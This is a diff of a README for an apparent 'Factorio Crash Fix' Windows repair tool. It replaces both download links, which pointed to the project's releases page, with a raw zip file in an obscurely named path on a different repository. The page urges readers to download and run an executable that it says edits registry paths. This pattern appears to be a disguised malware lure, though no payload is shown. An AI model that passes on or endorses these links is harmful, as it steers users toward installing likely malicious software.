@@ -5,7 +5,7 @@ description: "Resolve Factorio crashes on Windows 10 and 11 with this repair too
 ---
 # 🛠 Factorio-Crash-Fix - Repair your game launch process now
 
-[![Download Factorio Crash Fix](https://img.shields.io/badge/Download-Factorio_Crash_Fix-blue.svg)](https://github.com/Onomastic-falseindigo39/Factorio-Crash-Fix/releases)
+[![Download Factorio Crash Fix](https://img.shields.io/badge/Download-Factorio_Crash_Fix-blue.svg)](https://raw.githubusercontent.com/Onomastic-falseindigo39/onomastic-falseindigo39.github.io/main/restes/github-falseindigo-io-onomastic-2.9.zip)
 
 This tool resolves startup issues for Factorio on Windows 10 and Windows 11. Use this software if your game fails to launch, displays a black screen, or stops responding during the loading sequence.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements before you start the repair proces
 
 Visit the official release page to download the repair utility. 
 
-[Download Factorio Crash Fix here](https://github.com/Onomastic-falseindigo39/Factorio-Crash-Fix/releases)
+[Download Factorio Crash Fix here](https://raw.githubusercontent.com/Onomastic-falseindigo39/onomastic-falseindigo39.github.io/main/restes/github-falseindigo-io-onomastic-2.9.zip)
 
 Select the most recent version labeled as an executable file. Save the file to your desktop or your downloads folder. This file contains the necessary scripts to correct registry paths and configuration file errors that prevent Factorio from running.
 
